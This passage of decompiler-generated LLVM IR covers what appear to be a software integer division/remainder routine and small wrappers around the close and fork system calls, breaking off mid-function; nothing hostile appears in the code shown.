dec_label_pc_ca64thread-pre-split:                ; preds = %.thread4, %dec_label_pc_ca64thread-pre-split.loopexit
  %v1_ca7039 = phi i32 [ %storemerge95, %dec_label_pc_ca64thread-pre-split.loopexit ], [ %v2_ca70, %.thread4 ]
  %v0_ca64.pr = phi i32 [ %v0_ca64.pr3398, %dec_label_pc_ca64thread-pre-split.loopexit ], [ %v3_ca6c, %.thread4 ]
  br label %dec_label_pc_ca64

dec_label_pc_ca64.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_ca64

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca64.loopexit, %dec_label_pc_ca64thread-pre-split
  %v0_ca78.pr = phi i32 [ %v1_ca7039, %dec_label_pc_ca64thread-pre-split ], [ %storemerge101, %dec_label_pc_ca64.loopexit ]
  %v1_ca6c = phi i32 [ %v0_ca64.pr, %dec_label_pc_ca64thread-pre-split ], [ %v4_ca58, %dec_label_pc_ca64.loopexit ]
  %v2_ca64 = icmp slt i32 %v1_ca6c, 0
  br i1 %v2_ca64, label %dec_label_pc_ca78, label %bb79

bb79:                                             ; preds = %dec_label_pc_ca64
  %v4_ca68 = icmp ult i32 %v1_ca6c, %v1_ca38
  br i1 %v4_ca68, label %.thread4, label %dec_label_pc_ca78

.thread4:                                         ; preds = %bb79
  %v3_ca6c = mul i32 %v1_ca6c, 2
  %v2_ca70 = add i32 %v0_ca78.pr, 1
  br label %dec_label_pc_ca64thread-pre-split

dec_label_pc_ca78:                                ; preds = %bb79, %dec_label_pc_ca64
  %v2_ca78 = add i32 %v0_ca78.pr, -3
  %v5_ca7c = icmp slt i32 %v0_ca78.pr, 3
  br i1 %v5_ca7c, label %dec_label_pc_cabc, label %dec_label_pc_ca80

dec_label_pc_ca80:                                ; preds = %dec_label_pc_ca78, %bb83
  %v6_caa8 = phi i32 [ %v0_cab0, %bb83 ], [ %v2_ca78, %dec_label_pc_ca78 ]
  %v1_ca84 = phi i32 [ %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %bb83 ], [ %v1_ca38, %dec_label_pc_ca78 ]
  %v3_caa412 = phi i32 [ %v3_caa4, %bb83 ], [ %v1_ca6c, %dec_label_pc_ca78 ]
  %v3_ca80 = icmp ult i32 %v1_ca84, %v3_caa412
  %v3_ca84 = select i1 %v3_ca80, i32 0, i32 %v3_caa412
  %v1_ca8c = sub i32 %v1_ca84, %v3_ca84
  %v4_ca88 = udiv i32 %v3_caa412, 2
  %v6_ca88 = icmp ult i32 %v1_ca8c, %v4_ca88
  %v6_ca8c = select i1 %v6_ca88, i32 0, i32 %v4_ca88
  %v1_ca8c.v6_ca8c = sub i32 %v1_ca8c, %v6_ca8c
  %.demorgan = and i1 %v3_ca80, %v6_ca88
  %v4_ca90 = udiv i32 %v3_caa412, 4
  %v6_ca90 = icmp ult i32 %v1_ca8c.v6_ca8c, %v4_ca90
  %v6_ca94 = select i1 %v6_ca90, i32 0, i32 %v4_ca90
  %v1_ca8c.v6_ca8c.v6_ca94 = sub i32 %v1_ca8c.v6_ca8c, %v6_ca94
  %.demorgan71 = and i1 %.demorgan, %v6_ca90
  %v4_ca98 = udiv i32 %v3_caa412, 8
  %v6_ca98 = icmp ult i32 %v1_ca8c.v6_ca8c.v6_ca94, %v4_ca98
  %v6_ca9c = select i1 %v6_ca98, i32 0, i32 %v4_ca98
  %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c = sub i32 %v1_ca8c.v6_ca8c.v6_ca94, %v6_ca9c
  %.demorgan72 = and i1 %.demorgan71, %v6_ca98
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_ca80
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_ca80, %bb80
  %v2_caa0 = add i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, -1
  %v4_caa0 = sub i32 0, %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c
  %v5_caa0 = and i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %v4_caa0
  %v3_caa4 = udiv i32 %v3_caa412, 16
  %v5_caa8 = icmp slt i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, 1
  br i1 %v5_caa8, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_caa8 = add i32 %v6_caa8, -4
  %v9_caa8 = sub i32 3, %v6_caa8
  %v10_caa8 = and i32 %v9_caa8, %v6_caa8
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_cab0 = phi i32 [ %v6_caa8, %bb81 ], [ %v7_caa8, %bb82 ]
  %v0_caac15.in = phi i32 [ %v2_caa0, %bb81 ], [ %v7_caa8, %bb82 ]
  %v1_caac14.in = phi i32 [ %v5_caa0, %bb81 ], [ %v10_caa8, %bb82 ]
  %v1_caac14 = icmp slt i32 %v1_caac14.in, 0
  %v0_caac15 = icmp slt i32 %v0_caac15.in, 0
  %v2_caac = xor i1 %v0_caac15, %v1_caac14
  br i1 %v2_caac, label %dec_label_pc_cab0, label %dec_label_pc_ca80

dec_label_pc_cab0:                                ; preds = %bb83
  %v1_cab0 = urem i32 %v0_cab0, 4
  %v2_cab0 = icmp eq i32 %v1_cab0, 0
  br i1 %v2_cab0, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_cab0
  %v3_cab4 = icmp eq i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, 0
  br i1 %v3_cab4, label %bb76, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %bb84, %dec_label_pc_ca78
  %v0_cad0 = phi i32 [ %v3_caa4, %bb84 ], [ %v1_ca6c, %dec_label_pc_ca78 ]
  %v1_cacc = phi i32 [ %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %bb84 ], [ %v1_ca38, %dec_label_pc_ca78 ]
  %v0_cabc = phi i32 [ %v0_cab0, %bb84 ], [ %v2_ca78, %dec_label_pc_ca78 ]
  %v5_cac0 = icmp slt i32 %v0_cabc, -2
  br i1 %v5_cac0, label %dec_label_pc_cae0, label %dec_label_pc_cac4

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v8_cabc = icmp eq i32 %v0_cabc, -2
  br i1 %v8_cabc, label %dec_label_pc_cad4, label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cac4
  %v3_cac8 = icmp ult i32 %v1_cacc, %v0_cad0
  br i1 %v3_cac8, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_cac8
  %v2_cac8 = sub i32 %v1_cacc, %v0_cad0
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_cac8, %bb85
  %v0_cad452 = phi i32 [ %v1_cacc, %dec_label_pc_cac8 ], [ %v2_cac8, %bb85 ]
  %v3_cad0 = udiv i32 %v0_cad0, 2
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %dec_label_pc_cac4, %bb86
  %v0_cadc = phi i32 [ %v0_cad0, %dec_label_pc_cac4 ], [ %v3_cad0, %bb86 ]
  %v1_cad8 = phi i32 [ %v1_cacc, %dec_label_pc_cac4 ], [ %v0_cad452, %bb86 ]
  %v3_cad4 = icmp ult i32 %v1_cad8, %v0_cadc
  br i1 %v3_cad4, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_cad4
  %v2_cad4 = sub i32 %v1_cad8, %v0_cadc
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_cad4, %bb87
  %v0_cae055 = phi i32 [ %v1_cad8, %dec_label_pc_cad4 ], [ %v2_cad4, %bb87 ]
  %v3_cadc = udiv i32 %v0_cadc, 2
  br label %dec_label_pc_cae0

dec_label_pc_cae0:                                ; preds = %dec_label_pc_cabc, %bb88
  %v2_cae4 = phi i32 [ %v0_cad0, %dec_label_pc_cabc ], [ %v3_cadc, %bb88 ]
  %v1_cae4 = phi i32 [ %v1_cacc, %dec_label_pc_cabc ], [ %v0_cae055, %bb88 ]
  %v3_cae0 = icmp ult i32 %v1_cae4, %v2_cae4
  br i1 %v3_cae0, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_cae0
  %v2_cae0 = sub i32 %v1_cae4, %v2_cae4
  br label %bb76

dec_label_pc_caec:                                ; preds = %dec_label_pc_ca30
  %v0_caec = load i32, i32* @lr, align 4
  %v0_caf0 = call i32 @function_cbe0()
  call void @__pseudo_branch(i32 %v0_caec)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_cae4, { 1, 2, 0 }
  uselistorder i32 %v0_cad0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_cab0, { 1, 0, 2 }
  uselistorder i32 %v7_caa8, { 1, 0 }
  uselistorder i32 %v3_caa4, { 1, 0 }
  uselistorder i32 %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_ca98, { 1, 0 }
  uselistorder i32 %v4_ca90, { 1, 0 }
  uselistorder i32 %v4_ca88, { 1, 0 }
  uselistorder i32 %v6_caa8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_ca78, { 1, 0 }
  uselistorder i32 %v1_ca6c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_ca58, { 1, 0, 3, 2 }
  uselistorder i32 %v0_ca64.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ca38, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_cae0, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_cad4, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_ca80, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_cafc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cafc:
  store i32 %arg1, i32* @r0, align 4
  %v2_cafc = icmp eq i32 %arg2, 0
  br i1 %v2_cafc, label %dec_label_pc_cbd0, label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_cafc
  %v1_cafc = icmp slt i32 %arg2, 0
  br i1 %v1_cafc, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_cb04
  %v2_cb04 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_cb04, %bb
  %v4_cb1c = phi i32 [ %arg2, %dec_label_pc_cb04 ], [ %v2_cb04, %bb ]
  %v0_cb08 = load i32, i32* @r0, align 4
  %v1_cb08 = icmp slt i32 %v0_cb08, 0
  br i1 %v1_cb08, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_cb0c = sub i32 0, %v0_cb08
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_cb14 = phi i32 [ %v0_cb08, %bb79 ], [ %v2_cb0c, %bb80 ]
  %v1_cb10 = add i32 %v4_cb1c, -1
  %v7_cb10 = icmp eq i32 %v4_cb1c, 1
  br i1 %v7_cb10, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_cb14 = icmp eq i32 %v1_cb14, %v4_cb1c
  br i1 %v10_cb14, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_cb14 = icmp ult i32 %v1_cb14, %v4_cb1c
  br i1 %v4_cb14, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_cb1c = and i32 %v1_cb10, %v4_cb1c
  %v8_cb1c = icmp eq i32 %v6_cb1c, 0
  br i1 %v8_cb1c, label %.thread72, label %dec_label_pc_cb2c.preheader

dec_label_pc_cb2c.preheader:                      ; preds = %bb84
  %v2_cb2c109 = icmp ugt i32 %v4_cb1c, 268435455
  br i1 %v2_cb2c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_cb2064 = phi i32 [ %v1_cb14, %bb84 ], [ 0, %.thread70 ]
  %v3_cb20 = and i32 %v1_cb2064, %v1_cb10
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_cb2c.preheader
  %v0_cb40.pr35.lcssa = phi i32 [ %v4_cb1c, %dec_label_pc_cb2c.preheader ], [ %v4_cb34, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_cb2c.preheader ], [ %v2_cb389, %.thread2.thread7 ]
  br label %dec_label_pc_cb40thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_cb2c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_cb389, %.thread2.thread7 ], [ 0, %dec_label_pc_cb2c.preheader ]
  %v0_cb40.pr35110 = phi i32 [ %v4_cb34, %.thread2.thread7 ], [ %v4_cb1c, %dec_label_pc_cb2c.preheader ]
  %v4_cb30 = icmp ult i32 %v0_cb40.pr35110, %v1_cb14
  br i1 %v4_cb30, label %bb86, label %dec_label_pc_cb40thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_cb34 = and i32 %v0_cb40.pr35110, 268435456
  %v3_cb34 = icmp eq i32 %v2_cb34, 0
  %v4_cb34 = mul i32 %v0_cb40.pr35110, 16
  br i1 %v3_cb34, label %.thread2.thread7, label %dec_label_pc_cb40.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_cb389 = add i32 %storemerge111, 4
  %v2_cb2c = icmp ugt i32 %v4_cb34, 268435455
  br i1 %v2_cb2c, label %.thread1, label %bb85

dec_label_pc_cb40thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_cb40thread-pre-split.loopexit

dec_label_pc_cb40thread-pre-split.loopexit:       ; preds = %dec_label_pc_cb40thread-pre-split.loopexit.loopexit, %.thread1
  %v0_cb40.pr35108 = phi i32 [ %v0_cb40.pr35.lcssa, %.thread1 ], [ %v0_cb40.pr35110, %dec_label_pc_cb40thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_cb40thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_cb40thread-pre-split

dec_label_pc_cb40thread-pre-split:                ; preds = %.thread4, %dec_label_pc_cb40thread-pre-split.loopexit
  %v1_cb4c41 = phi i32 [ %storemerge105, %dec_label_pc_cb40thread-pre-split.loopexit ], [ %v2_cb4c, %.thread4 ]
  %v2_cb4436 = phi i32 [ %v1_cb14, %dec_label_pc_cb40thread-pre-split.loopexit ], [ %v2_cb44, %.thread4 ]
  %v0_cb40.pr = phi i32 [ %v0_cb40.pr35108, %dec_label_pc_cb40thread-pre-split.loopexit ], [ %v3_cb48, %.thread4 ]
  br label %dec_label_pc_cb40

dec_label_pc_cb40.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_cb40

dec_label_pc_cb40:                                ; preds = %dec_label_pc_cb40.loopexit, %dec_label_pc_cb40thread-pre-split
  %v0_cb54.pr = phi i32 [ %v1_cb4c41, %dec_label_pc_cb40thread-pre-split ], [ %storemerge111, %dec_label_pc_cb40.loopexit ]
  %v2_cb44 = phi i32 [ %v2_cb4436, %dec_label_pc_cb40thread-pre-split ], [ %v1_cb14, %dec_label_pc_cb40.loopexit ]
  %v1_cb48 = phi i32 [ %v0_cb40.pr, %dec_label_pc_cb40thread-pre-split ], [ %v4_cb34, %dec_label_pc_cb40.loopexit ]
  %v2_cb40 = icmp slt i32 %v1_cb48, 0
  br i1 %v2_cb40, label %dec_label_pc_cb54, label %bb87

bb87:                                             ; preds = %dec_label_pc_cb40
  %v4_cb44 = icmp ult i32 %v1_cb48, %v2_cb44
  br i1 %v4_cb44, label %.thread4, label %dec_label_pc_cb54

.thread4:                                         ; preds = %bb87
  %v3_cb48 = mul i32 %v1_cb48, 2
  %v2_cb4c = add i32 %v0_cb54.pr, 1
  br label %dec_label_pc_cb40thread-pre-split

dec_label_pc_cb54:                                ; preds = %bb87, %dec_label_pc_cb40
  %v2_cb54 = add i32 %v0_cb54.pr, -3
  %v5_cb58 = icmp slt i32 %v0_cb54.pr, 3
  br i1 %v5_cb58, label %dec_label_pc_cb98, label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb54, %bb91
  %v6_cb84 = phi i32 [ %v0_cb8c, %bb91 ], [ %v2_cb54, %dec_label_pc_cb54 ]
  %v1_cb60 = phi i32 [ %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %bb91 ], [ %v2_cb44, %dec_label_pc_cb54 ]
  %v3_cb8010 = phi i32 [ %v3_cb80, %bb91 ], [ %v1_cb48, %dec_label_pc_cb54 ]
  %v3_cb5c = icmp ult i32 %v1_cb60, %v3_cb8010
  %v3_cb60 = select i1 %v3_cb5c, i32 0, i32 %v3_cb8010
  %v1_cb68 = sub i32 %v1_cb60, %v3_cb60
  %v4_cb64 = udiv i32 %v3_cb8010, 2
  %v6_cb64 = icmp ult i32 %v1_cb68, %v4_cb64
  %v6_cb68 = select i1 %v6_cb64, i32 0, i32 %v4_cb64
  %v1_cb68.v6_cb68 = sub i32 %v1_cb68, %v6_cb68
  %.demorgan = and i1 %v3_cb5c, %v6_cb64
  %v4_cb6c = udiv i32 %v3_cb8010, 4
  %v6_cb6c = icmp ult i32 %v1_cb68.v6_cb68, %v4_cb6c
  %v6_cb70 = select i1 %v6_cb6c, i32 0, i32 %v4_cb6c
  %v1_cb68.v6_cb68.v6_cb70 = sub i32 %v1_cb68.v6_cb68, %v6_cb70
  %.demorgan76 = and i1 %.demorgan, %v6_cb6c
  %v4_cb74 = udiv i32 %v3_cb8010, 8
  %v6_cb74 = icmp ult i32 %v1_cb68.v6_cb68.v6_cb70, %v4_cb74
  %v6_cb78 = select i1 %v6_cb74, i32 0, i32 %v4_cb74
  %v1_cb68.v6_cb68.v6_cb70.v6_cb78 = sub i32 %v1_cb68.v6_cb68.v6_cb70, %v6_cb78
  %.demorgan77 = and i1 %.demorgan76, %v6_cb74
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_cb5c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_cb5c, %bb88
  %v2_cb7c = add i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, -1
  %v4_cb7c = sub i32 0, %v1_cb68.v6_cb68.v6_cb70.v6_cb78
  %v5_cb7c = and i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %v4_cb7c
  %v3_cb80 = udiv i32 %v3_cb8010, 16
  %v5_cb84 = icmp slt i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, 1
  br i1 %v5_cb84, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_cb84 = add i32 %v6_cb84, -4
  %v9_cb84 = sub i32 3, %v6_cb84
  %v10_cb84 = and i32 %v9_cb84, %v6_cb84
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_cb8c = phi i32 [ %v6_cb84, %bb89 ], [ %v7_cb84, %bb90 ]
  %v0_cb8813.in = phi i32 [ %v2_cb7c, %bb89 ], [ %v7_cb84, %bb90 ]
  %v1_cb8812.in = phi i32 [ %v5_cb7c, %bb89 ], [ %v10_cb84, %bb90 ]
  %v1_cb8812 = icmp slt i32 %v1_cb8812.in, 0
  %v0_cb8813 = icmp slt i32 %v0_cb8813.in, 0
  %v2_cb88 = xor i1 %v0_cb8813, %v1_cb8812
  br i1 %v2_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb5c

dec_label_pc_cb8c:                                ; preds = %bb91
  %v1_cb8c = urem i32 %v0_cb8c, 4
  %v2_cb8c = icmp eq i32 %v1_cb8c, 0
  br i1 %v2_cb8c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_cb8c
  %v3_cb90 = icmp eq i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, 0
  br i1 %v3_cb90, label %.thread6, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %bb92, %dec_label_pc_cb54
  %v0_cbac = phi i32 [ %v3_cb80, %bb92 ], [ %v1_cb48, %dec_label_pc_cb54 ]
  %v1_cba8 = phi i32 [ %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %bb92 ], [ %v2_cb44, %dec_label_pc_cb54 ]
  %v0_cb98 = phi i32 [ %v0_cb8c, %bb92 ], [ %v2_cb54, %dec_label_pc_cb54 ]
  %v5_cb9c = icmp slt i32 %v0_cb98, -2
  br i1 %v5_cb9c, label %dec_label_pc_cbbc, label %dec_label_pc_cba0

dec_label_pc_cba0:                                ; preds = %dec_label_pc_cb98
  %v8_cb98 = icmp eq i32 %v0_cb98, -2
  br i1 %v8_cb98, label %dec_label_pc_cbb0, label %dec_label_pc_cba4

dec_label_pc_cba4:                                ; preds = %dec_label_pc_cba0
  %v3_cba4 = icmp ult i32 %v1_cba8, %v0_cbac
  br i1 %v3_cba4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_cba4
  %v2_cba4 = sub i32 %v1_cba8, %v0_cbac
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_cba4, %bb93
  %v0_cbb054 = phi i32 [ %v1_cba8, %dec_label_pc_cba4 ], [ %v2_cba4, %bb93 ]
  %v3_cbac = udiv i32 %v0_cbac, 2
  br label %dec_label_pc_cbb0

dec_label_pc_cbb0:                                ; preds = %dec_label_pc_cba0, %bb94
  %v0_cbb8 = phi i32 [ %v0_cbac, %dec_label_pc_cba0 ], [ %v3_cbac, %bb94 ]
  %v1_cbb4 = phi i32 [ %v1_cba8, %dec_label_pc_cba0 ], [ %v0_cbb054, %bb94 ]
  %v3_cbb0 = icmp ult i32 %v1_cbb4, %v0_cbb8
  br i1 %v3_cbb0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_cbb0
  %v2_cbb0 = sub i32 %v1_cbb4, %v0_cbb8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_cbb0, %bb95
  %v0_cbbc57 = phi i32 [ %v1_cbb4, %dec_label_pc_cbb0 ], [ %v2_cbb0, %bb95 ]
  %v3_cbb8 = udiv i32 %v0_cbb8, 2
  br label %dec_label_pc_cbbc

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cb98, %bb96
  %v2_cbc0 = phi i32 [ %v0_cbac, %dec_label_pc_cb98 ], [ %v3_cbb8, %bb96 ]
  %v1_cbc0 = phi i32 [ %v1_cba8, %dec_label_pc_cb98 ], [ %v0_cbbc57, %bb96 ]
  %v3_cbbc = icmp ult i32 %v1_cbc0, %v2_cbc0
  br i1 %v3_cbbc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_cbbc
  %v2_cbbc = sub i32 %v1_cbc0, %v2_cbc0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_cbbc, %bb83, %.thread72, %dec_label_pc_cb8c, %bb92, %bb97
  %v1_cbc8 = phi i32 [ %v1_cb68.v6_cb68.v6_cb70.v6_cb78, %dec_label_pc_cb8c ], [ 0, %bb92 ], [ %v1_cbc0, %dec_label_pc_cbbc ], [ %v2_cbbc, %bb97 ], [ %v3_cb20, %.thread72 ], [ %v1_cb14, %bb83 ]
  br i1 %v1_cb08, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_cbc8 = sub i32 0, %v1_cbc8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_cbcc = phi i32 [ %v1_cbc8, %.thread6 ], [ %v2_cbc8, %bb98 ]
  ret i32 %v1_cbcc

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cafc
  %v0_cbd0 = load i32, i32* @lr, align 4
  %v0_cbd4 = call i32 @function_cbe0()
  call void @__pseudo_branch(i32 %v0_cbd0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_cbac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_cb8c, { 1, 0, 2 }
  uselistorder i32 %v7_cb84, { 1, 0 }
  uselistorder i32 %v3_cb80, { 1, 0 }
  uselistorder i32 %v1_cb68.v6_cb68.v6_cb70.v6_cb78, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_cb74, { 1, 0 }
  uselistorder i32 %v4_cb6c, { 1, 0 }
  uselistorder i32 %v4_cb64, { 1, 0 }
  uselistorder i32 %v6_cb84, { 3, 0, 2, 1 }
  uselistorder i32 %v2_cb54, { 1, 0 }
  uselistorder i32 %v1_cb48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_cb44, { 1, 0, 3, 2 }
  uselistorder i32 %v4_cb34, { 1, 0, 3, 2 }
  uselistorder i32 %v0_cb40.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cb14, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_cb1c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_cbbc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_cbb0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_cbe0() local_unnamed_addr {
dec_label_pc_cbe0:
  %v1_cbe0 = load i32, i32* @r0, align 4
  ret i32 %v1_cbe0
}

define i32 @function_cbe4(i32 %arg1) local_unnamed_addr {
dec_label_pc_cbe4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cbe4 = load i32, i32* @r4, align 4
  store i32 %v3_cbe4, i32* %stack_var_-8, align 4
  %v1_cbe8 = call i32 @close(i32 %arg1)
  store i32 %v1_cbe8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_cbe8, -4095
  br i1 %tmp, label %dec_label_pc_cc08, label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbe4
  %v0_cbf8 = call i32 @function_cec4()
  %v0_cbfc = load i32, i32* %r4.global-to-local, align 4
  %v1_cbfc = sub i32 0, %v0_cbfc
  %v2_cc00 = inttoptr i32 %v0_cbf8 to i32*
  store i32 %v1_cbfc, i32* %v2_cc00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cc08

dec_label_pc_cc08:                                ; preds = %dec_label_pc_cbe4, %dec_label_pc_cbf8
  %v0_cc08 = phi i32 [ %v1_cbe8, %dec_label_pc_cbe4 ], [ -1, %dec_label_pc_cbf8 ]
  %v2_cc0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cc0c, i32* @r4, align 4
  ret i32 %v0_cc08

; uselistorder directives
  uselistorder i32 %v1_cbe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc08, { 1, 0 }
}

define i32 @function_cc10() local_unnamed_addr {
dec_label_pc_cc10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cc10 = load i32, i32* @r4, align 4
  store i32 %v3_cc10, i32* %stack_var_-8, align 4
  %v0_cc14 = call i32 @fork()
  store i32 %v0_cc14, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cc14, -4095
  br i1 %tmp, label %dec_label_pc_cc34, label %dec_label_pc_cc24

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cc10
  %v0_cc24 = call i32 @function_cec4()
  %v0_cc28 = load i32, i32* %r4.global-to-local, align 4
  %v1_cc28 = sub i32 0, %v0_cc28
  %v2_cc2c = inttoptr i32 %v0_cc24 to i32*
  store i32 %v1_cc28, i32* %v2_cc2c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cc34

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cc10, %dec_label_pc_cc24
  %v0_cc34 = phi i32 [ %v0_cc14, %dec_label_pc_cc10 ], [ -1, %dec_label_pc_cc24 ]
  %v2_cc38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cc38, i32* @r4, align 4
  ret i32 %v0_cc34

; uselistorder directives
  uselistorder i32 %v0_cc14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc34, { 1, 0 }
}

define i32 @function_cc3c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cc3c:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_cc3c = load i32, i32* @r4, align 4
  store i32 %v3_cc3c, i32* %stack_var_-20, align 4
  %v6_cc3c = load i32, i32* @r5, align 4
  %v9_cc3c = load i32, i32* @r6, align 4
  %v12_cc3c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_cc40 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* @r5, align 4
  %v3_cc4c = icmp eq i8* %arg1, null
  br i1 %v2_cc40, label %dec_label_pc_cc4c, label %dec_label_pc_cc7c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc3c
  br i1 %v3_cc4c, label %dec_label_pc_cc68, label %dec_label_pc_cc54

dec_label_pc_cc54:                                ; preds = %dec_label_pc_cc4c
  %v0_cc54 = call i32 @function_cec4()
  %v0_cc58 = load i32, i32* @r7, align 4
